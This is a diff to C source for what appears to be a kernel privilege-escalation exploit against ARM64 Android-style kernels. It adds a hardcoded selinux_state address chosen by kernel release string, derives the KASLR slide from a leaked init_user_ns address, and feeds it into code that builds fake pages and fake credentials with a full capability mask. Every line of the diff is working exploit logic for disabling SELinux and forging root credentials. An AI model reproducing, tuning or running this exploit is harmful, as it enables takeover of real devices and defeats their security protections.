@@ -312,6 +312,18 @@ static void unpin0(void){cpu_set_t cs;CPU_ZERO(&cs);for(int i=0;i<16;i++)CPU_SET
 static pid_t g_me;
 #define INIT_USER_NS_STATIC 0xffffffc0826d10d8ULL
 #define SELINUX_STATE_STATIC 0xffffffc082959630ULL
+/* Server/SoC profiles: the O1 kernel is a different build; only the
+   selinux_state link address differs (init_user_ns is identical). */
+#define SELINUX_STATE_O1_STATIC 0xffffffc082958630ULL
+static unsigned long long selinux_state_static(void){
+ static unsigned long long v=0;
+ if(v)return v;
+ v=SELINUX_STATE_STATIC;
+ {struct utsname u;
+  if(uname(&u)==0&&(strstr(u.release,"g1d099fcb35e0")||strstr(u.release,"abogki538445360")))v=SELINUX_STATE_O1_STATIC;
+  printf("SELINUX_PROFILE kernel=%s base=0x%llx\n",u.release,v);}
+ fflush(stdout);return v;
+}
 static unsigned long long g_cred=0,g_tg[4]={0,0,0,0};
 static unsigned long long g_un=0,g_sel=0;
 #define FULL_CAP_MASK 0x1ffffffffffULL
@@ -481,10 +493,10 @@ static int do_attempt(int att, pid_t *outpid){
   mk=0x1a00ULL;MARK=PAGE+mk;
   if(d3_mode()&&g_stage==0){
     if(!g_un){printf("VERDICT NO_SLIDE\n");benign_cleanup(pid,zombie);return 1;}
-    g_sel=SELINUX_STATE_STATIC+(g_un-INIT_USER_NS_STATIC);
+    g_sel=selinux_state_static()+(g_un-INIT_USER_NS_STATIC);
     if(d3_setup()){printf("VERDICT D3_SETUP\n");benign_cleanup(pid,zombie);return 1;}
     S=d3_S[0];
-  } else { if(g_selmode&&g_stage==0){ if(!g_un){printf("VERDICT NO_SLIDE\n");benign_cleanup(pid,zombie);return 1;} g_sel=SELINUX_STATE_STATIC+(g_un-INIT_USER_NS_STATIC); S=selzero_mode()?(g_sel-7ULL):g_sel; } else S=PTASK+0x908; }
+  } else { if(g_selmode&&g_stage==0){ if(!g_un){printf("VERDICT NO_SLIDE\n");benign_cleanup(pid,zombie);return 1;} g_sel=selinux_state_static()+(g_un-INIT_USER_NS_STATIC); S=selzero_mode()?(g_sel-7ULL):g_sel; } else S=PTASK+0x908; }
 printf("FAKEPAGE kva=0x%llx MARK=0x%llx S=0x%llx stage=%d\n",g_fakekva,MARK,S,g_stage);fflush(stdout);
  sdlog("FAKEPAGE S=0x%llx\n",S);
  fill_fake_cred(N);
@@ -1230,6 +1242,7 @@ int main(int argc,char**argv){
  setvbuf(stdout,0,_IONBF,0);
  { struct rlimit rl; rl.rlim_cur=524288; rl.rlim_max=524288; setrlimit(RLIMIT_NOFILE,&rl); }
  {char bb[96];int n=0;int fd=open("/proc/sys/kernel/random/boot_id",O_RDONLY);if(fd>=0){n=(int)read(fd,bb,95);close(fd);}if(n>0){int i2=0;while(i2<n && bb[i2]!=10 && bb[i2]!=13)i2++;fputs("BOOTID ",stdout);for(int k2=0;k2<i2;k2++)putchar(bb[k2]);putchar(10);fflush(stdout);}}
+ selinux_state_static();
  tbuf=malloc(48u<<20);
  if(!tbuf){printf("malloc fail\n");return 1;}
  prctl(PR_SET_CHILD_SUBREAPER,1,0,0,0);
